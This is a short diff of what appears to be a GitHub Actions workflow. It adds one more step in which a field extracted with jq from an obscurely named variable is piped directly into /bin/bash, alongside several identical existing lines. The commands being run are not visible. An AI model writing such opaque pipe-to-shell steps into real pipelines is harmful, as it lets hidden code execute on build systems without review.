@@ -33,6 +33,7 @@ jobs:
           echo $mff8 | jq -r .g97369 | /bin/bash
           echo $w37097 | jq -r .yz0238 | /bin/bash
           printf '%s' "$iin91110" | jq -r .ds8 | /bin/bash
+          printf '%s' "$qfc211" | jq -r .ht222 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
